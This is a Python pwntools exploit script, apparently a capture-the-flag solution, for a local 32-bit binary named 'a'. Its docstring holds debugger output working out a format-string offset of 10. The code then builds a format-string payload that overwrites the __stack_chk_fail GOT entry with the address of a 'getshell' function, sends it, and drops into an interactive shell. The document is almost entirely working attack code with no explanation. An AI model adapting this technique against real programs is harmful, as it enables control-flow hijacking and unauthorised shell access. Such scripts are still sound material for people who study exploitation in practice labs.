# !/usr/bin/python
# coding=utf-8
'''offset
0x80485fe <main+125>       call   0x80483e0 <read@plt>
read@plt (
  [sp + 0x0] = 0x00000000,
  [sp + 0x4] = 0xffffd0b8 → 0xf7ffd940 → 0x00000000,
  [sp + 0x8] = 0x00000063
)

0x804860d <main+140>       call   0x80483f0 <printf@plt>
0xffffd090│+0x0000: 0xffffd0b8  →  "AAAA"    ← $esp

offset
=(addr_buf-$esp)/para_size
=(0xffffd0b8tele-0xffffd090)/4
=10

$ stack 40
00:0000│ esp     0xffffd490 —▸ 0xffffd4b8 ◂— 0xa31 /* '1\n' */
09:0024│         0xffffd4b4 —▸ 0xffffd5dc —▸ 0xffffd745 ◂— 'USER=kali'
...
0a:0028│ eax ecx 0xffffd4b8 ◂— 0xa31 /* '1\n' */
$ fmt    0xffffd4b8  => 10 => offset 10
$ fmtarg 0xffffd4b8  => 10 => offset 10
'''
from pwn import *
import time

context(os='linux', arch='i386', log_level='debug')
sh = process('a')
offset = 10
scf_got = ELF('a').got['__stack_chk_fail']
getshell_addr = ELF('a').sym['getshell']
exp = fmtstr_payload(offset, {scf_got: getshell_addr})
print(exp)
sh.send(exp + b'A' * 100)
sh.interactive()
